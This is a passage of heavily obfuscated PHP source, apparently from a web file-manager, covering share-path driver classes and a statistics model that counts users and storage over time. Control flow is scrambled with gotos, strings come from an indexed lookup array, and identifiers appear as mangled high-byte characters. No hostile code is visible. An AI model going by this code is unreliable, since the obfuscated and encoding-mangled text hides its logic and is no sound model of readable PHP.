$this->getPathOuter($Bƒµä‡ΩıŒ); } public function uploadLink($F—ˆ•Ó ≠∑, $Bö–ÁÈ∂¢” = 0) { $a¡§í≠—∞© =& $_SERVER[™⁄»üÆ]; $aΩ…å∏≥ÓÊ = $this->parse($F—ˆ•Ó ≠∑); $cî¯Ÿáã™® = _get($GLOBALS[$a¡§í≠—∞©[7]], $a¡§í≠—∞©[1216]); $cÉñÜÔ˜ë∫ = _get($GLOBALS[$a¡§í≠—∞©[7]], $a¡§í≠—∞©[1217]); $F—ˆ•Ó ≠∑ = Model($a¡§í≠—∞©[585])->createFileName($aΩ…å∏≥ÓÊ[$a¡§í≠—∞©[76]], $cî¯Ÿáã™®, $cÉñÜÔ˜ë∫); return IO::uploadLink($F—ˆ•Ó ≠∑, $Bö–ÁÈ∂¢”); } public function fileNameAuto($F∆ﬁä˘Ç±·, $d€Áñ»÷“˘, $f¢åÑé¡¯Õ = REPEAT_REPLACE, $E°ÆƒÃ“òÙ = false) { return $this->model->fileNameAuto($F∆ﬁä˘Ç±·, $d€Áñ»÷“˘, $f¢åÑé¡¯Õ, $E°ÆƒÃ“òÙ); } public function fileNameExist($a≤ÙÏŸ‡ï¯, $dÑÏ∫äŸâ™) { return $this->model->fileNameExist($a≤ÙÏŸ‡ï¯, $dÑÏ∫äŸâ™); } protected function _fileOut($AË¿‹™˘’∞, $dââú≤æ‚∆ = false, $AÕˆ“∫è£û = false, $AåΩ¶æ‹ü‘ = '', $D∑Í‹â÷ÜÇ = false) { goto eúÕÙÓ—‚õ; a÷ãçª¯Öµ: $C√ÉâìéèÃ = $this->model->fileInfoGet($AË¿‹™˘’∞); $AåΩ¶æ‹ü‘ = $C√ÉâìéèÃ[$e”“Ñ∑æó»[170]] ? $C√ÉâìéèÃ[$e”“Ñ∑æó»[170]] : $AåΩ¶æ‹ü‘; $FØ∂ãØ°´Î = isset($GLOBALS[$e”“Ñ∑æó»[1219]]) ? $GLOBALS[$e”“Ñ∑æó»[1219]] : $EèÉ∂îÌ†î[$e”“Ñ∑æó»[28]]; goto C¡ÆØâ°º´; C¡ÆØâ°º´: if ($D∑Í‹â÷ÜÇ) { return IO::fileOutServer($C√ÉâìéèÃ[$e”“Ñ∑æó»[76]], $dââú≤æ‚∆, $FØ∂ãØ°´Î, $AåΩ¶æ‹ü‘); } IO::fileOut($C√ÉâìéèÃ[$e”“Ñ∑æó»[76]], $dââú≤æ‚∆, $FØ∂ãØ°´Î, $AåΩ¶æ‹ü‘); goto dÊ¡ƒäïéﬁ; eúÕÙÓ—‚õ: $e”“Ñ∑æó» =& $_SERVER[™⁄»üÆ]; $EèÉ∂îÌ†î = $this->model->sourceInfo($AË¿‹™˘’∞); if ($EèÉ∂îÌ†î[$e”“Ñ∑æó»[404]] == $e”“Ñ∑æó»[87]) { header($e”“Ñ∑æó»[1218]); die; } goto a÷ãçª¯Öµ; dÊ¡ƒäïéﬁ: } public function fileOut($D§∆¿ÓÃÁï, $CØºÔ≈áﬂ¡ = false, $dñ™ÿ©Â‘÷ = false, $cÍ˘÷â·ËÈ = '') { $this->_fileOut($D§∆¿ÓÃÁï, $CØºÔ≈áﬂ¡, $dñ™ÿ©Â‘÷, $cÍ˘÷â·ËÈ); } public function fileOutServer($döˆ˜àÀÁ£, $bÕ—Ω±ç£Ò = false, $Cƒ∞ËÖ…ïﬁ = false, $D¥Ë—Çπû‹ = '') { $this->_fileOut($döˆ˜àÀÁ£, $bÕ—Ω±ç£Ò, $Cƒ∞ËÖ…ïﬁ, $D¥Ë—Çπû‹, !0); } protected function _fileOutImage($FÃ∂Ò÷àûÛ, $eö€Ω«‡ú« = 250) { goto dÖÈøûë∫£; eíËı–·´˜: $GLOBALS[$Aä¯—∫Ôä∆[1219]] = $DÑﬂÜñ€’∑[$Aä¯—∫Ôä∆[28]]; $GLOBALS[$Aä¯—∫Ôä∆[162]] = $DÑﬂÜñ€’∑; IO::fileOutImage($DÑﬂÜñ€’∑[$Aä¯—∫Ôä∆[76]], $eö€Ω«‡ú«); goto EØâÉ√®¥; dÖÈøûë∫£: $Aä¯—∫Ôä∆ =& $_SERVER[™⁄»üÆ]; $D…™¯ı´ﬂë = $this->model->pathInfo($FÃ∂Ò÷àûÛ); if ($D…™¯ı´ﬂë[$Aä¯—∫Ôä∆[404]] == $Aä¯—∫Ôä∆[87]) { show_json($Aä¯—∫Ôä∆[1220] . $FÃ∂Ò÷àûÛ, !1); } goto B≤ç‘∑¨Èõ; B≤ç‘∑¨Èõ: $DÑﬂÜñ€’∑ = $this->model->fileInfoGet($FÃ∂Ò÷àûÛ); $DÑﬂÜñ€’∑[$Aä¯—∫Ôä∆[28]] = $D…™¯ı´ﬂë[$Aä¯—∫Ôä∆[28]]; $DÑﬂÜñ€’∑[$Aä¯—∫Ôä∆[163]] = $D…™¯ı´ﬂë[$Aä¯—∫Ôä∆[163]]; goto eíËı–·´˜; EØâÉ√®¥: } public function fileOutImage($c∑¯ª°‡¥é, $fçÎŒëé•∆ = 250) { $this->_fileOutImage($c∑¯ª°‡¥é, $fçÎŒëé•∆); } public function fileOutImageServer($AÕòÉÚΩ‹Ò, $cﬁœá‹òÍ = 250) { $this->_fileOutImage($AÕòÉÚΩ‹Ò, $cﬁœá‹òÍ); } public function link($e•î∏•∆Ëâ, $açÿ€Ô•†Ñ = '') { $EŸ¨ı∆ıƒ = $this->model->fileInfoGet($e•î∏•∆Ëâ); return IO::link($EŸ¨ı∆ıƒ[$_SERVER[™⁄»üÆ][76]], $açÿ€Ô•†Ñ); } protected function parse($E∞≥«Ù÷õ ) { $c‹€≤«ËÑ¡ =& $_SERVER[™⁄»üÆ]; if (strstr($E∞≥«Ù÷õ , $c‹€≤«ËÑ¡[8]) === !1) { return array($c‹€≤«ËÑ¡[413] => intval($E∞≥«Ù÷õ ), $c‹€≤«ËÑ¡[76] => $c‹€≤«ËÑ¡[33], $c‹€≤«ËÑ¡[1215] => array()); } $AÜø¯È´œ¥ = explode($c‹€≤«ËÑ¡[8], trim($E∞≥«Ù÷õ , $c‹€≤«ËÑ¡[8])); if (count($AÜø¯È´œ¥) < 2) { show_tips($E∞≥«Ù÷õ  . $c‹€≤«ËÑ¡[1221]); } return array($c‹€≤«ËÑ¡[413] => intval($AÜø¯È´œ¥[0]), $c‹€≤«ËÑ¡[76] => $AÜø¯È´œ¥[1], $c‹€≤«ËÑ¡[1215] => array_slice($AÜø¯È´œ¥, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($eØî¶Ö±∂€) { $this->pathParse = $eØî¶Ö±∂€; $this->model = Model($_SERVER[™⁄»üÆ][1214]); } public function getPathOuter($Eå„»æ‚ÌÔ) { $B»⁄ÂÛ“ÍË =& $_SERVER[™⁄»üÆ]; if (!$Eå„»æ‚ÌÔ) { return $Eå„»æ‚ÌÔ; } $A∫ÉÇàà¥É = $this->parse($Eå„»æ‚ÌÔ); return trim(KodIO::makeShare($this->pathParse[$B»⁄ÂÛ“ÍË[394]], $A∫ÉÇàà¥É[$B»⁄ÂÛ“ÍË[394]]), $B»⁄ÂÛ“ÍË[8]); } protected function infoParse($a€±’ÿêØÜ, $F≠¡‚õ™§º = false, $BÕ©Ó ªè¨ = false) { $fıÏµŒë◊ó =& $_SERVER[™⁄»üÆ]; $dãçóãÑßœ = $this->pathParse[$fıÏµŒë◊ó[394]]; $Cä€ûÇüê = trim($this->pathParse[$fıÏµŒë◊ó[1072]], $fıÏµŒë◊ó[8]); return Action($fıÏµŒë◊ó[1222])->sharePathInfo($dãçóãÑßœ, $Cä€ûÇüê); } public function infoFull($D—¥∞ÕéÓä) { $CˆÑÌÀ˜Éì =& $_SERVER[™⁄»üÆ]; $f‹ÏÆÉ‰éó = explode($CˆÑÌÀ˜Éì[8], trim($D—¥∞ÕéÓä, $CˆÑÌÀ˜Éì[8])); if (count($f‹ÏÆÉ‰éó) > 1) { $Fê¿Éç¶™Ï = implode($CˆÑÌÀ˜Éì[8], array_splice($f‹ÏÆÉ‰éó, 1)); $C∂ÑàÇÛÌö = $this->model->pathInfoByPath($f‹ÏÆÉ‰éó[0], $Fê¿Éç¶™Ï); if (!$C∂ÑàÇÛÌö) { return !1; } $this->pathParse[$CˆÑÌÀ˜Éì[1072]] = $C∂ÑàÇÛÌö[$CˆÑÌÀ˜Éì[396]]; } return $this->infoParse($D—¥∞ÕéÓä); } public function listAll($a∑¥Â“Êª¶) { goto e∫ßå≈¥ÍÆ; e∫ßå≈¥ÍÆ: $a“Ú„Í¿≥Á =& $_SERVER[™⁄»üÆ]; $b©°Ó’Ë»å = IO::info($this->pathParse[$a“Ú„Í¿≥Á[76]]); if (!$b©°Ó’Ë»å) { return array(); } goto E∂â∞≠û⁄‡; E∂â∞≠û⁄‡: $F˜„–§®»á = $this->model->listAll($a∑¥Â“Êª¶); $dÆëÙãºÒ¯ = Model($a“Ú„Í¿≥Á[577])->getInfo($b©°Ó’Ë»å[$a“Ú„Í¿≥Á[469]]); $cãÆ∑ñöÖú = Action($a“Ú„Í¿≥Á[1222]); goto c•áÙ‚Á≈…; c•áÙ‚Á≈…: foreach ($F˜„–§®»á as &$F»˘„µç÷„) { check_abort(); $F»˘„µç÷„[$a“Ú„Í¿≥Á[85]] = $cãÆ∑ñöÖú->_shareItemeParse($F»˘„µç÷„[$a“Ú„Í¿≥Á[85]], $dÆëÙãºÒ¯); } unset($F»˘„µç÷„); return $F˜„–§®»á; goto cÙê≤⁄å™∫; cÙê≤⁄å™∫: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Dä«ñ„Ü‡¶) { $this->pathParse = $Dä«ñ„Ü‡¶; $this->model = Model($_SERVER[™⁄»üÆ][1214]); } protected function infoParse($aú«¥¬”ıË, $Dúπ‘Œªû = false, $däÖ≥çôÊˆ = false) { $aÚ£òÈ‡ƒ‘ =& $_SERVER[™⁄»üÆ]; return Action($aÚ£òÈ‡ƒ‘[1078])->sharePathInfo($this->pathParse[$aÚ£òÈ‡ƒ‘[76]], !0); } public function listPath($e«ıàäƒ≥, $cÒ˘ˆÙ∫ÛÏ = false) { $d·ÛŸ£ﬁ∂é =& $_SERVER[™⁄»üÆ]; $dÍ≤¶õﬁíË = parent::listPath($e«ıàäƒ≥, $cÒ˘ˆÙ∫ÛÏ); foreach ($dÍ≤¶õﬁíË as $a≠¢å˜·Ãë => $cê¬ˆ«Ú£Û) { if (!in_array($a≠¢å˜·Ãë, array($d·ÛŸ£ﬁ∂é[74], $d·ÛŸ£ﬁ∂é[75]))) { continue; } foreach ($cê¬ˆ«Ú£Û as $cãôΩ‘é◊Î => $F†Ø£¿ôì) { $dÍ≤¶õﬁíË[$a≠¢å˜·Ãë][$cãôΩ‘é◊Î] = Action($d·ÛŸ£ﬁ∂é[1078])->shareItemInfo($F†Ø£¿ôì); } } return $dÍ≤¶õﬁíË; } public function listAll($dÓèòÕ¥è») { goto bµ…Ã≤›£–; bµ…Ã≤›£–: $fÕŸÁ ÊΩÑ =& $_SERVER[™⁄»üÆ]; $bó‹Ÿµ¿ıØ = IO::info($this->pathParse[$fÕŸÁ ÊΩÑ[76]]); if (!$bó‹Ÿµ¿ıØ) { return array(); } goto Dì‚¯ªëÓ´; CâãÜ–¥∆˜: return $B¢÷ÉËùôÛ; goto cÆå∆ÜêﬂÛ; Dì‚¯ªëÓ´: $B¢÷ÉËùôÛ = $this->model->listAll($dÓèòÕ¥è»); foreach ($B¢÷ÉËùôÛ as &$b»…⁄ÂÎΩÙ) { $b»…⁄ÂÎΩÙ[$fÕŸÁ ÊΩÑ[85]] = Action($fÕŸÁ ÊΩÑ[1078])->shareItemInfo($b»…⁄ÂÎΩÙ[$fÕŸÁ ÊΩÑ[85]]); } unset($b»…⁄ÂÎΩÙ); goto CâãÜ–¥∆˜; cÆå∆ÜêﬂÛ: } } goto D‹πÙ∞üÃÿ; däÕ¯ûÒ•: class AnalysisModel extends ModelBaseLight { public function init($Fûí®ä—âÇ) { $bÜ¨ê»∏◊≤ =& $_SERVER[™⁄»üÆ]; $b’†ÏÒ¯Â∫ = array($bÜ¨ê»∏◊≤[576] => array($bÜ¨ê»∏◊≤[29] => $bÜ¨ê»∏◊≤[1632], $bÜ¨ê»∏◊≤[271] => array($bÜ¨ê»∏◊≤[222], $bÜ¨ê»∏◊≤[744], $bÜ¨ê»∏◊≤[1633], $bÜ¨ê»∏◊≤[1634])), $bÜ¨ê»∏◊≤[1635] => array($bÜ¨ê»∏◊≤[29] => $bÜ¨ê»∏◊≤[1636], $bÜ¨ê»∏◊≤[271] => array($bÜ¨ê»∏◊≤[222], $bÜ¨ê»∏◊≤[742], $bÜ¨ê»∏◊≤[1637], $bÜ¨ê»∏◊≤[1638], $bÜ¨ê»∏◊≤[1639]))); if (!isset($b’†ÏÒ¯Â∫[$Fûí®ä—âÇ])) { return !1; } $this->optionType = $b’†ÏÒ¯Â∫[$Fûí®ä—âÇ][$bÜ¨ê»∏◊≤[29]]; $this->field = $b’†ÏÒ¯Â∫[$Fûí®ä—âÇ][$bÜ¨ê»∏◊≤[271]]; return !0; } public function listData($DŸÇÍÉó‘Ç = false, $bÿÆºãÛôÑ = "\155\x6f\x64\x69\x66\171\124\x69\x6d\145", $fµÕÍ–“–Ê = false) { return parent::listData($DŸÇÍÉó‘Ç, $bÿÆºãÛôÑ, $fµÕÍ–“–Ê); } public function trendList($cÜÜè¢œÿô) { goto a§ïÛí∂–ñ; B—ÏüÆÃ†í: foreach ($B¯•ÃòıÏ∫ as $B”ëùÜíÈ’) { $this->{$f¯øíÈ’Éö}($B”ëùÜíÈ’); } return $this->listData(); goto D≈Ê⁄ïœÑÓ; Fñíë”‰Í†: if (!isset($fÏ‡¶ˆ≈Ê)) { $BçóºÁáÂ≈ = $cÜÜè¢œÿô == $cÀóê™∑Œ‚[576] ? $cÀóê™∑Œ‚[520] : $cÀóê™∑Œ‚[809]; $fÏ‡¶ˆ≈Ê = Model($BçóºÁáÂ≈)->min($cÀóê™∑Œ‚[194]); } $f¯øíÈ’Éö = $cÀóê™∑Œ‚[1642] . ucfirst($cÜÜè¢œÿô); $B¯•ÃòıÏ∫ = $this->dateList($fÏ‡¶ˆ≈Ê); goto B—ÏüÆÃ†í; a§ïÛí∂–ñ: $cÀóê™∑Œ‚ =& $_SERVER[™⁄»üÆ]; $Cª‰Ù§Â¥À = $this->listData(); if ($Cª‰Ù§Â¥À) { $cö è˜¢©∞ = end($Cª‰Ù§Â¥À); $B”ëùÜíÈ’ = date($cÀóê™∑Œ‚[1640], strtotime($cÀóê™∑Œ‚[1641])); if ($cö è˜¢©∞[$cÀóê™∑Œ‚[222]] == $B”ëùÜíÈ’) { return $Cª‰Ù§Â¥À; } $fÏ‡¶ˆ≈Ê = strtotime($cö è˜¢©∞[$cÀóê™∑Œ‚[222]]); } goto Fñíë”‰Í†; D≈Ê⁄ïœÑÓ: } private function dateList($açﬂ–ëÖÖ∂) { $C£ÁçÜÛêê =& $_SERVER[™⁄»üÆ]; $Eêµ∫‰√≥± = $açﬂ–ëÖÖ∂; $F‚ÈœµêÚÉ = strtotime($C£ÁçÜÛêê[1641]); $Cœ›∆¶©êÜ = array(); while ($Eêµ∫‰√≥± <= $F‚ÈœµêÚÉ) { $Cœ›∆¶©êÜ[] = date($C£ÁçÜÛêê[1640], $Eêµ∫‰√≥±); $Eêµ∫‰√≥± = strtotime($C£ÁçÜÛêê[1643], $Eêµ∫‰√≥±); } return $Cœ›∆¶©êÜ; } public function _recordUser($DáØôØ¬û¬ = '') { goto Cçö≤ö‚¿Ó; dò≠´„É…í: $Eâ¶ë÷Ì¶™ = Model($fÖçû©Õ∞å[520])->where($EÓåõëéÃè)->count($fÖçû©Õ∞å[1537]); $EÓåõëéÃè[$fÖçû©Õ∞å[29]] = $fÖçû©Õ∞å[1646]; $E¢è∏ëõµã = Model($fÖçû©Õ∞å[1647])->where($EÓåõëéÃè)->count($fÖçû©Õ∞å[1648]); goto bü ¨œÇØË; b÷£Ù·îèÖ: $EÓåõëéÃè = array($fÖçû©Õ∞å[194] => array($fÖçû©Õ∞å[980], $BÉÀˆ¨•§∆)); $cñôÚΩ„ÓÜ = Model($fÖçû©Õ∞å[520])->where($EÓåõëéÃè)->count($fÖçû©Õ∞å[1537]); $EÓåõëéÃè[$fÖçû©Õ∞å[194]] = array($fÖçû©Õ∞å[331], array($D≤à—íÚÕª, $BÉÀˆ¨•§∆)); goto dò≠´„É…í; Cçö≤ö‚¿Ó: $fÖçû©Õ∞å =& $_SERVER[™⁄»üÆ]; $D≤à—íÚÕª = strtotime(date($fÖçû©Õ∞å[1644], strtotime($DáØôØ¬û¬))); $BÉÀˆ¨•§∆ = strtotime(date($fÖçû©Õ∞å[1645], strtotime($DáØôØ¬û¬))); goto b÷£Ù·îèÖ; bü ¨œÇØË: $Fã’˘»†í≈ = array($fÖçû©Õ∞å[222] => $DáØôØ¬û¬, $fÖçû©Õ∞å[744] => (int) $cñôÚΩ„ÓÜ, $fÖçû©Õ∞å[1633] => (int) $Eâ¶ë÷Ì¶™, $fÖçû©Õ∞å[1634] => (int) $E¢è∏ëõµã); return $this->insert($Fã’˘»†í≈); goto D≠¨œáñ—â; D≠¨œáñ—â: } public function _recordStore($cÖÛﬂ•â¨à = '') { goto Eëä∏äàÀò; Eëä∏äàÀò: $E¿±˜¥®∞™ =& $_SERVER[™⁄»üÆ]; $AÃ¨Â€¥ä = strtotime(date($E¿±˜¥®∞™[1645], strtotime($cÖÛﬂ•â¨à))); $dªÈö§©ï¶ = array($E¿±˜¥®∞™[194] => array($E¿±˜¥®∞™[980], $AÃ¨Â€¥ä)); goto Dù≥ïÀ√Ñ©; bÇ∑È®ëµÈ: $dªÈö§©ï¶[$E¿±˜¥®∞™[405]] = 1; $FÀº≈†îØ≠ = Model($E¿±˜¥®∞™[809])->where($dªÈö§©ï¶)->sum($E¿±˜¥®∞™[78]); $dªÈö§©ï¶[$E¿±˜¥®∞™[405]] = 2; goto Eêçßë©Æ≠; Eêçßë©Æ≠: $b ¨ﬂ»ˆÎŸ = Model($E¿±˜¥®∞™[809])->where($dªÈö§©ï¶)->sum($E¿±˜¥®∞™[78]); $Då·ﬂƒ˘Â® = array($E¿±˜¥®∞™[222] => $cÖÛﬂ•â¨à, $E¿±˜¥®∞™[742] => (int) $d‚”‰˘ôÕ–, $E¿±˜¥®∞™[1637] => (int) $dâàêµøÓé, $E¿±˜¥®∞™[1638] => (int) $FÀº≈†îØ≠, $E¿±˜¥®∞™[1639] => (int) $b ¨ﬂ»ˆÎŸ); return $this->insert($Då·ﬂƒ˘Â®); goto aÿèó–•Âô; Dù≥ïÀ√Ñ©: $dâàêµøÓé = Model($E¿±˜¥®∞™[451])->where($dªÈö§©ï¶)->sum($E¿±˜¥®∞™[78]); $dªÈö§©ï¶[$E¿±˜¥®∞™[404]] = 0; $d‚”‰˘ôÕ– = Model($E¿±˜¥®∞™[809])->where($dªÈö§©ï¶)->sum($E¿±˜¥®∞™[78]); goto bÇ∑È®ëµÈ; aÿèó–•Âô: } public function trend($B≠ﬂ‹–π°Ω, $E÷ú§£ìÖ⁄) { goto FÕ…ôÓé‹ê; d–â∫≤®ûƒ: return $D‹¯Æ¿‘¬Ú; goto aî≤≠˘ÏŒ£; fÓîê—˘Ω„: if ($d€ãÏÀª¥‡ && $E÷ú§£ìÖ⁄ != $DŸ´Ì≤ˆêä[1510]) { $A∆◊öú›òœ = $d€ãÏÀª¥‡[0][$DŸ´Ì≤ˆêä[222]]; $a¥øÉﬁ∂úË = $this->validDate($E÷ú§£ìÖ⁄, $A∆◊öú›òœ); $BÀ∏òÇ«Ñ” = array(); $Bó–îÇï≠ã = array_to_keyvalue($d€ãÏÀª¥‡, $DŸ´Ì≤ˆêä[222]); foreach ($a¥øÉﬁ∂úË as $aãÔ˜Ó≈Ùì) { if (isset($Bó–îÇï≠ã[$aãÔ˜Ó≈Ùì])) { $c∫ºâπè∏Ù = $Bó–îÇï≠ã[$aãÔ˜Ó≈Ùì]; } else { $c∫ºâπè∏Ù = end($d€ãÏÀª¥‡); $c∫ºâπè∏Ù[$DŸ´Ì≤ˆêä[222]] = $aãÔ˜Ó≈Ùì; if ($B≠ﬂ‹–π°Ω == $DŸ´Ì≤ˆêä[576]) { $c∫ºâπè∏Ù[$DŸ´Ì≤ˆêä[1633]] = $c∫ºâπè∏Ù[$DŸ´Ì≤ˆêä[1634]] = 0; } } $BÀ∏òÇ«Ñ”[] = $c∫ºâπè∏Ù; } $d€ãÏÀª¥‡ = $BÀ∏òÇ«Ñ”; } $Fèê»ÏãÇÈ = array($DŸ´Ì≤ˆêä[576] => array($DŸ´Ì≤ˆêä[744] => LNG($DŸ´Ì≤ˆêä[1649]), $DŸ´Ì≤ˆêä[1633] => LNG($DŸ´Ì≤ˆêä[1650]), $DŸ´Ì≤ˆêä[1634] => LNG($DŸ´Ì≤ˆêä[1651])), $DŸ´Ì≤ˆêä[1635] => array($DŸ´Ì≤ˆêä[742] => LNG($DŸ´Ì≤ˆêä[1652]), $DŸ´Ì≤ˆêä[1637] => LNG($DŸ´Ì≤ˆêä[1653]), $DŸ´Ì≤ˆêä[1638] => LNG($DŸ´Ì≤ˆêä[1654]), $DŸ´Ì≤ˆêä[1639] => LNG($DŸ´Ì≤ˆêä[1655]))); $C˜à˜ŸÊ≥ö = array($DŸ´Ì≤ˆêä[576] => $DŸ´Ì≤ˆêä[1656], $DŸ´Ì≤ˆêä[1635] => $DŸ´Ì≤ˆêä[78]); goto fﬂÇÏ™èôõ; FÕ…ôÓé‹ê: $DŸ´Ì≤ˆêä =& $_SERVER[™⁄»üÆ]; if (!$this->init($B≠ﬂ‹–π°Ω)) { return !1; } $d€ãÏÀª¥‡ = $this->trendList($B≠ﬂ‹–π°Ω); goto fÓîê—˘Ω„; fﬂÇÏ™èôõ: if (empty($d€ãÏÀª¥‡)) { $aãÔ˜Ó≈Ùì = date($DŸ´Ì≤ˆêä[1640], strtotime($DŸ´Ì≤ˆêä[1641])); $F®Á·≤ÿÕ = array($DŸ´Ì≤ˆêä[222] => $aãÔ˜Ó≈Ùì); foreach ($Fèê»ÏãÇÈ[$B≠ﬂ‹–π°Ω] as $AÑ‹Ñ∑∂Á¶ => $D¢Ã≠õıÍﬂ) { $F®Á·≤ÿÕ[$AÑ‹Ñ∑∂Á¶] = 0; } $d€ãÏÀª¥‡[] = $F®Á·≤ÿÕ; } $D‹¯Æ¿‘¬Ú = array(); foreach ($d€ãÏÀª¥‡ as $D¢Ã≠õıÍﬂ) { if ($B≠ﬂ‹–π°Ω == $DŸ´Ì≤ˆêä[1635] && $D¢Ã≠õıÍﬂ[$DŸ´Ì≤ˆêä[1637]] > $D¢Ã≠õıÍﬂ[$DŸ´Ì≤ˆêä[742]]) { $D¢Ã≠õıÍﬂ[$DŸ´Ì≤ˆêä[1637]] = $D¢Ã≠õıÍﬂ[$DŸ´Ì≤ˆêä[742]]; } foreach ($Fèê»ÏãÇÈ[$B≠ﬂ‹–π°Ω] as $AÑ‹Ñ∑∂Á¶ => $DΩ†âäç©ñ) { $c∫ºâπè∏Ù = array($DŸ´Ì≤ˆêä[222] => $D¢Ã≠õıÍﬂ[$DŸ´Ì≤ˆêä[222]], $DŸ´Ì≤ˆêä[1440] => $DΩ†âäç©ñ); $c∫ºâπè∏Ù[$C˜à˜ŸÊ≥ö[$B≠ﬂ‹–π°Ω]] = isset($D¢Ã≠õıÍﬂ[$AÑ‹Ñ∑∂Á¶]) ? $D¢Ã≠õıÍﬂ[$AÑ‹Ñ∑∂Á¶] : 0; $D‹¯Æ¿‘¬Ú[] = $c∫ºâπè∏Ù; } } goto d–â∫≤®ûƒ; aî≤≠˘ÏŒ£: } public function validDate($E˜•⁄÷ÉÑÉ, $E€Ì—éÑ˜É) { goto a›ËÁì„ƒ÷; DÍ“‚æô„∂: return $Fç±Ù°éÒﬁ; goto cà¡Ï…‡”Ã; A’∫∂åÁ∆§: switch ($E˜•⁄÷ÉÑÉ) { case $bõÖ¡ïΩãò[1517]: $BºÍàâî∑ÿ = mktime(0, 0, 0, date($bõÖ¡ïΩãò[1657]), date($bõÖ¡ïΩãò[1261]) - date($bõÖ¡ïΩãò[1322]) + 7 - 7, date($bõÖ¡ïΩãò[1658])); $E§êä–ÀøÊ = 0; do { $aúã“„¢ßà = date($bõÖ¡ïΩãò[1640], $BºÍàâî∑ÿ - 3600 * 24 * 7 * $E§êä–ÀøÊ); $Fç±Ù°éÒﬁ[] = $aúã“„¢ßà; $E§êä–ÀøÊ++; } while ($E€Ì—éÑ˜É < $aúã“„¢ßà); break; case $bõÖ¡ïΩãò[1515]: $E§êä–ÀøÊ = 1; do { $B©≈≠πïï’ = date($bõÖ¡ïΩãò[1659], strtotime("\55\40{$E§êä–ÀøÊ}\x20\155\157\156\x74\150\163")); $Fç±Ù°éÒﬁ[] = $B©≈≠πïï’; $E§êä–ÀøÊ++; } while ($E€Ì—éÑ˜É < $B©≈≠πïï’); break; case $bõÖ¡ïΩãò[1660]: $CùÂÉ¶¨åÛ = (int) date($bõÖ¡ïΩãò[1658], strtotime($E€Ì—éÑ˜É)); $D˜èÆ£†‘Õ = (int) date($bõÖ¡ïΩãò[1658]); if ($CùÂÉ¶¨åÛ >= $D˜èÆ£†‘Õ) { break; } for ($CùÂÉ¶¨åÛ; $CùÂÉ¶¨åÛ < $D˜èÆ£†‘Õ; $CùÂÉ¶¨åÛ++) { $Fç±Ù°éÒﬁ[] = $CùÂÉ¶¨åÛ . $bõÖ¡ïΩãò[1661]; } break; default: break; } if ($E€Ì—éÑ˜É > end($Fç±Ù°éÒﬁ)) { array_pop($Fç±Ù°éÒﬁ); } sort($Fç±Ù°éÒﬁ); goto DÍ“‚æô„∂; a›ËÁì„ƒ÷: $bõÖ¡ïΩãò =& $_SERVER[™⁄»üÆ]; $A®ƒΩÜøØé = date($bõÖ¡ïΩãò[1640], strtotime($bõÖ¡ïΩãò[1641])); $Fç±Ù°éÒﬁ = array($A®ƒΩÜøØé); goto A’∫∂åÁ∆§; cà¡Ï…‡”Ã: } public function listTable($BéÀ∫ÒØÂÛ) { $Eö¯æ¯•ÎΩ = ucfirst($BéÀ∫ÒØÂÛ); return Model($Eö¯æ¯•ÎΩ)->listData(); } public function option($B«ø∏¥âÈ˘) { $cœ´ï»ûëÏ = $_SERVER[™⁄»üÆ][1662] . ucfirst($B«ø∏¥âÈ˘); return $this->{$cœ´ï»ûëÏ}(); } private function optionUser() { goto e‘ö°ÃÖæ£; eçáêâöÚ®: if (!$aÆéÎ¬‰øç) { $aÆéÎ¬‰øç = 1; } $E´ÆÿÌâ« = array($eúàó∏∏Çª[1664] => array($eúàó∏∏Çª[981], $eª÷åÓ¬Ö”)); $CΩ⁄øƒπù› = Model($eúàó∏∏Çª[520])->where($E´ÆÿÌâ«)->count($eúàó∏∏Çª[1537]); goto Fµ•Õºû√Á; e‘ö°ÃÖæ£: $eúàó∏∏Çª =& $_SERVER[™⁄»üÆ]; $d∆√Ñ˘Ú¥» = Model($eúàó∏∏Çª[520])->count($eúàó∏∏Çª[1537]); $FéàıÏ∏ˆ° = Model($eúàó∏∏Çª[520])->where($eúàó∏∏Çª[1663])->count($eúàó∏∏Çª[1537]); goto déÊÊﬁ·•€; bö√Ω›Ñıæ: if ($a≥ƒ∆ü¢Ì≈ < $eª÷åÓ¬Ö”) { $a≥ƒ∆ü¢Ì≈ = $eª÷åÓ¬Ö”; } $E´ÆÿÌâ« = array($eúàó∏∏Çª[1664] => array($eúàó∏∏Çª[981], $a≥ƒ∆ü¢Ì≈)); $aÆéÎ¬‰øç = (int) Model($eúàó∏∏Çª[520])->where($E´ÆÿÌâ«)->count($eúàó∏∏Çª[1537]); goto eçáêâöÚ®; déÊÊﬁ·•€: $béöèèª¿î = intval($GLOBALS[$eúàó∏∏Çª[6]][$eúàó∏∏Çª[347]][$eúàó∏∏Çª[1496]]) / 3600; $a≥ƒ∆ü¢Ì≈ = strtotime("\x2d{$béöèèª¿î}\40\150\x6f\165\162\163"); $eª÷åÓ¬Ö” = strtotime(date($eúàó∏∏Çª[1644])); goto bö√Ω›Ñıæ; Fµ•Õºû√Á: return array($eúàó∏∏Çª[738] => (int) $d∆√Ñ˘Ú¥», $eúàó∏∏Çª[1665] => (int) ($d∆√Ñ˘Ú¥» - $FéàıÏ∏ˆ°), $eúàó∏∏Çª[1666] => (int) $FéàıÏ∏ˆ°, $eúàó∏∏Çª[1667] => (int) $CΩ⁄øƒπù›, $eúàó∏∏Çª[1668] => $aÆéÎ¬‰øç); goto a¢Àãê„∆§; a¢Àãê„∆§: } private function optionFile() { goto EË¬¶¡·çä; f∑≈€≥„±ﬁ: $C‚¬¨∑‘  = Model($Cﬂ€»”∏ﬁì[809])->where($EÖàñÒΩÜ)->sum($Cﬂ€»”∏ﬁì[78]); $BõËü”Íˆâ = Model($Cﬂ€»”∏ﬁì[809])->where($EÖàñÒΩÜ)->count($Cﬂ€»”∏ﬁì[396]); return array($Cﬂ€»”∏ﬁì[742] => $b·π‹◊£òç, $Cﬂ€»”∏ﬁì[1637] => $Aßäñ∫àëª, $Cﬂ€»”∏ﬁì[1669] => $b·π‹◊£òç - $Aßäñ∫àëª, $Cﬂ€»”∏ﬁì[1670] => (int) $C‚¬¨∑‘ , $Cﬂ€»”∏ﬁì[744] => (int) $C¿Ñ¡îÉàü, $Cﬂ€»”∏ﬁì[1671] => (int) $BõËü”Íˆâ); goto C˜£ó·ÇÈ£; FƒÎôÆÓöø: $Aßäñ∫àëª = $cÌéß◊Ë‘¶[$Cﬂ€»”∏ﬁì[1637]]; $C¿Ñ¡îÉàü = Model($Cﬂ€»”∏ﬁì[809])->where(array($Cﬂ€»”∏ﬁì[404] => 